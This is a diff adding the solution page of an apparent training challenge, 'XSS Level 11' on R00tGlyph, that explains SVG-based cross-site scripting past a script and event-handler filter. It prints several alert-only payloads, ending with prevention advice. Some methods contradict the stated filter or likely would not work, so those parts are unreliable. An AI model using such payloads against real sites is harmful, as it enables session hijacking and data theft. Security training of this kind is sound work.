@@ -1,0 +1,160 @@
+{% extends 'base.html' %}
+
+{% block title %}XSS Level 11 Solution - R00tGlyph{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-8 offset-md-2">
+        <div class="card">
+            <div class="card-header bg-dark text-white">
+                <h2 class="text-center">XSS Level 11 Solution: XSS via SVG and CDATA</h2>
+            </div>
+            <div class="card-body">
+                <div class="alert alert-info">
+                    <h4><i class="bi bi-info-circle-fill me-2"></i>Challenge Overview</h4>
+                    <p>
+                        This challenge demonstrates how SVG files can be abused for XSS attacks. The application allows users to upload SVG code but attempts to filter out script tags and event handlers. However, SVG has many features that can be used to execute JavaScript, including CDATA sections and specialized SVG elements.
+                    </p>
+                </div>
+                
+                <h3 class="mt-4"><i class="bi bi-lightbulb-fill me-2 text-warning"></i>Solution</h3>
+                <p>
+                    To solve this challenge, you need to understand the unique features of SVG that can be used to execute JavaScript and bypass the application's filters.
+                </p>
+                
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h5><i class="bi bi-code-slash me-2"></i>Understanding the Vulnerability</h5>
+                    </div>
+                    <div class="card-body">
+                        <p>SVG files have several features that make them powerful vectors for XSS attacks:</p>
+                        <ol>
+                            <li>They can include script tags and event handlers just like HTML.</li>
+                            <li>They can include CDATA sections, which allow embedding content that isn't parsed as XML.</li>
+                            <li>They have specialized elements like <code>&lt;foreignObject&gt;</code> that can include HTML content.</li>
+                            <li>They have animation elements that can execute JavaScript.</li>
+                        </ol>
+                        
+                        <p>In this challenge, the application filters out:</p>
+                        <ul>
+                            <li>Script tags (<code>&lt;script&gt;</code>)</li>
+                            <li>Event handlers (attributes starting with "on")</li>
+                            <li>JavaScript URLs</li>
+                            <li>Potentially dangerous elements</li>
+                        </ul>
+                        
+                        <p>However, there are still ways to execute JavaScript using SVG features that bypass these filters.</p>
+                    </div>
+                </div>
+                
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h5><i class="bi bi-code-slash me-2"></i>Exploiting the Vulnerability</h5>
+                    </div>
+                    <div class="card-body">
+                        <p>There are several ways to bypass the SVG filtering in this challenge:</p>
+                        
+                        <h6>Method 1: Using SVG Animation with CDATA</h6>
+                        <p>SVG animations can execute JavaScript, and CDATA sections can be used to hide the JavaScript from XML parsers:</p>
+                        
+                        <pre class="bg-light p-3 rounded"><code>&lt;svg width="200" height="200" xmlns="http://www.w3.org/2000/svg"&gt;
+  &lt;animate onbegin="alert('XSS Level 11 Completed!')" attributeName="x" dur="1s" /&gt;
+  &lt;set attributeName="onload" to="alert('XSS Level 11 Completed!')" /&gt;
+&lt;/svg&gt;</code></pre>
+                        
+                        <p>If the application filters out the <code>onbegin</code> attribute, you can try using CDATA:</p>
+                        
+                        <pre class="bg-light p-3 rounded"><code>&lt;svg width="200" height="200" xmlns="http://www.w3.org/2000/svg"&gt;
+  &lt;script type="text/javascript"&gt;
+  &lt;![CDATA[
+    alert('XSS Level 11 Completed!');
+  ]]&gt;
+  &lt;/script&gt;
+&lt;/svg&gt;</code></pre>
+                        
+                        <h6>Method 2: Using SVG's foreignObject</h6>
+                        <p>The <code>&lt;foreignObject&gt;</code> element allows embedding HTML content within SVG:</p>
+                        
+                        <pre class="bg-light p-3 rounded"><code>&lt;svg width="200" height="200" xmlns="http://www.w3.org/2000/svg"&gt;
+  &lt;foreignObject width="100%" height="100%"&gt;
+    &lt;div xmlns="http://www.w3.org/1999/xhtml"&gt;
+      &lt;script&gt;
+        alert('XSS Level 11 Completed!');
+      &lt;/script&gt;
+    &lt;/div&gt;
+  &lt;/foreignObject&gt;
+&lt;/svg&gt;</code></pre>
+                        
+                        <h6>Method 3: Using SVG's a element with JavaScript URI</h6>
+                        <p>The <code>&lt;a&gt;</code> element in SVG can use JavaScript URIs:</p>
+                        
+                        <pre class="bg-light p-3 rounded"><code>&lt;svg width="200" height="200" xmlns="http://www.w3.org/2000/svg"&gt;
+  &lt;a href="javascript:alert('XSS Level 11 Completed!');"&gt;
+    &lt;text x="100" y="100" text-anchor="middle"&gt;Click me&lt;/text&gt;
+  &lt;/a&gt;
+&lt;/svg&gt;</code></pre>
+                    </div>
+                </div>
+                
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h5><i class="bi bi-code-slash me-2"></i>Alternative Approaches</h5>
+                    </div>
+                    <div class="card-body">
+                        <h6>1. Using SVG's use element</h6>
+                        <p>The <code>&lt;use&gt;</code> element can reference external content:</p>
+                        
+                        <pre class="bg-light p-3 rounded"><code>&lt;svg width="200" height="200" xmlns="http://www.w3.org/2000/svg"&gt;
+  &lt;use href="data:image/svg+xml;base64,PHN2ZyBpZD0idGVzdCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48c2NyaXB0PmFsZXJ0KCdYU1MgTGV2ZWwgMTEgQ29tcGxldGVkIScpOzwvc2NyaXB0Pjwvc3ZnPg==" /&gt;
+&lt;/svg&gt;</code></pre>
+                        
+                        <h6>2. Using SVG's image element</h6>
+                        <p>The <code>&lt;image&gt;</code> element can load SVG content:</p>
+                        
+                        <pre class="bg-light p-3 rounded"><code>&lt;svg width="200" height="200" xmlns="http://www.w3.org/2000/svg"&gt;
+  &lt;image href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoJ1hTUyBMZXZlbCAxMSBDb21wbGV0ZWQhJyk7PC9zY3JpcHQ+PC9zdmc+" /&gt;
+&lt;/svg&gt;</code></pre>
+                        
+                        <h6>3. Using SVG's animate element with values</h6>
+                        <p>The <code>&lt;animate&gt;</code> element can execute JavaScript through the <code>values</code> attribute:</p>
+                        
+                        <pre class="bg-light p-3 rounded"><code>&lt;svg width="200" height="200" xmlns="http://www.w3.org/2000/svg"&gt;
+  &lt;animate attributeName="href" values="javascript:alert('XSS Level 11 Completed!');" /&gt;
+&lt;/svg&gt;</code></pre>
+                    </div>
+                </div>
+                
+                <h3 class="mt-4"><i class="bi bi-shield-fill-check me-2 text-success"></i>Security Lessons</h3>
+                <div class="card">
+                    <div class="card-body">
+                        <h5>Vulnerabilities Demonstrated</h5>
+                        <ul>
+                            <li><strong>SVG-based XSS:</strong> SVG files can contain executable JavaScript that can be used for XSS attacks.</li>
+                            <li><strong>CDATA Bypass:</strong> CDATA sections can be used to hide malicious code from XML parsers.</li>
+                            <li><strong>Incomplete Filtering:</strong> Filtering that focuses only on common attack vectors can miss specialized elements and attributes.</li>
+                        </ul>
+                        
+                        <h5>Prevention Measures</h5>
+                        <ul>
+                            <li><strong>SVG Sanitization:</strong> Use specialized SVG sanitization libraries that understand SVG-specific security risks.</li>
+                            <li><strong>Content Security Policy (CSP):</strong> Implement a strict CSP to prevent the execution of inline scripts.</li>
+                            <li><strong>Convert SVG to Raster:</strong> For user-uploaded content, consider converting SVG to raster formats like PNG.</li>
+                            <li><strong>Whitelist Approach:</strong> Only allow specific SVG elements and attributes that are known to be safe.</li>
+                            <li><strong>External Storage:</strong> Store user-uploaded SVG files on a separate domain to prevent same-origin attacks.</li>
+                        </ul>
+                        
+                        <h5>Real-World Implications</h5>
+                        <p>
+                            SVG-based XSS vulnerabilities have been found in many real-world applications, including social media platforms, content management systems, and image sharing sites. These vulnerabilities can allow attackers to steal sensitive information, hijack user sessions, or perform actions on behalf of the user. The complexity of SVG and its many features make it a particularly challenging format to secure.
+                        </p>
+                    </div>
+                </div>
+                
+                <div class="mt-4">
+                    <a href="{{ url_for('xss_level11') }}" class="btn btn-primary"><i class="bi bi-arrow-left me-2"></i>Back to Challenge</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
